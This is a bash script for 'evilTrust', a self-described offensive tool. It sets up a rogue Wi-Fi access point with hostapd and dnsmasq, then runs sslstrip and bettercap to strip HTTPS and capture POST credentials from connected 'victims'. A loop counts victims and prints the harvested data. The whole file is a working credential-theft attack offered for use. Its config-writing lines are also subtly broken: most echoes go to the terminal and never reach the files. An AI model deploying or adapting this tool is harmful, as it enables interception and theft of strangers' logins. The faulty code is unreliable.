#!/bin/bash

function ctrl_c() {
    echo -e "\n\nExiting...\n"
    rm dnsmasq.conf hostapd.conf 2>/dev/null
    rm -r iface 2>/dev/null
    find -name datos-privados.txt | xargs rm 2>/dev/null
    sleep 3
    ifconfig wlan0mon down 2>/dev/null
    sleep 1
    iwconfig wlan0mon mode monitor 2>/dev/null
    sleep 1
    ifconfig wlan0mon up 2>/dev/null
    airmon-ng stop wlan0mon > /dev/null 2>&1
    sleep 1
    tput cnorm
    service network-manager restart
    exit 0
}

function banner() {
    echo -e "\n[*] Welcome to evilTrust, an offensive tool to deploy a Rogue AP tailored to your liking."
    echo -e "[*] Developed by Wrench\n"
}

function dependencies() {
    sleep 1.5
    counter=0
    echo -e "\n[*] Checking required programs...\n"
    sleep 1

    dependencias=(php dnsmasq hostapd)

    for programa in "${dependencias[@]}"; do
        if command -v "$programa" &>/dev/null; then
            echo -e ". . . . . . . . [V] Tool $programa is installed"
            let counter+=1
        else
            echo -e "[X] Tool $programa is not installed"
        fi
        sleep 0.4
    done

    if [ "$counter" -eq 3 ]; then
        echo -e "\n[*] Starting...\n"
        sleep 3
    else
        echo -e "\n[!] You need to have the tools php, dnsmasq, and hostapd installed to run this script\n"
        tput cnorm
        exit 1
    fi
}

function getCredentials() {
    activeHosts=0
    tput civis
    while true; do
        echo -e "\n[*] Waiting for credentials (Ctrl+C to exit)...\n"
        for i in $(seq 1 60); do echo -ne "-"; done && echo -e "\n"
        echo -e "Victims connected: $activeHosts\n"
        find -name datos-privados.txt | xargs cat 2>/dev/null
        for i in $(seq 1 60); do echo -ne "-"; done && echo -e "\n"
        activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
        sleep 3
        clear
    done
}

function startAttack() {
    clear
    if [[ -e credenciales.txt ]]; then
        rm -rf credenciales.txt
    fi

    echo -e "\n[*] Listing available network interfaces...\n"
    sleep 1

    airmon-ng start wlan0 > /dev/null 2>&1
    interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
    counter=1

    for interface in $(cat iface); do
        echo -e "\t\n$counter. $interface"
        let counter++
        sleep 0.26
    done
    tput cnorm

    checker=0
    while [ $checker -ne 1 ]; do
        echo -ne "\n[*] Enter the interface name (e.g., wlan0mon): "
        read -r choosed_interface

        for interface in $(cat iface); do
            if [ "$choosed_interface" == "$interface" ]; then
                checker=1
            fi
        done

        if [ $checker -eq 0 ]; then
            echo -e "\n[!] The interface does not exist"
        fi
    done

    rm iface 2>/dev/null
    echo -ne "\n[*] Enter the name of the access point to be used (e.g., wifiGratis): "
    read -r use_ssid
    echo -ne "[*] Enter the channel to use (1-12): "
    read -r use_channel
    tput civis

    echo -e "\n[!] Killing all connections...\n"
    sleep 2
    killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
    sleep 5

    echo -e "interface=$choosed_interface\n" > host
    echo -e "ssid=$use_ssid\n"
    echo -e "channel=$use_channel\n"
    echo -e "ignore_broadcast_ssid=0\n"
    echo -e "hw_mode=g\n"
    echo -e "macaddr_acl=0\n"
    echo -e "auth_algs=1\n"
    echo -e "ignore_broadcast_ssid=0\n"
    echo -e "wpa=2\n"
    echo -e "wpa_passphrase=changeme123\n"
    echo -e "wpa_key_mgmt=WPA-PSK\n"
    echo -e "wpa_pairwise=TKIP\n"
    echo -e "rsn_pairwise=CCMP\n" > hostapd.conf

    echo -e "interface=$choosed_interface\n"
    echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n"
    echo -e "dhcp-option=3,192.168.1.1\n"
    echo -e "dhcp-option=6,192.168.1.1\n"
    echo -e "server=8.8.8.8\n"
    echo -e "log-queries\n"
    echo -e "log-dhcp\n"
    echo -e "listen-address=127.0.0.1\n" > dnsmasq.conf

    # Start EvilTrust attack
    xterm -e "dnsmasq -C dnsmasq.conf -d &" &
    sleep 2
    xterm -e "hostapd hostapd.conf" &
    sleep 2

    echo -e "\n[!] Waiting for victims to connect...\n"
    sleep 5

    # Capture credentials
    xterm -e "bash utilities/sslstrip.sh -w /var/www/html/log.txt" &
    sleep 2
    xterm -e "bettercap -I $choosed_interface -X --proxy --proxy-https -P POST" &
    sleep 2

    # Monitor active hosts
    xterm -e "bash utilities/hostsCheck.sh" &

    # Capture credentials loop
    getCredentials
}

trap ctrl_c INT
banner
dependencies
startAttack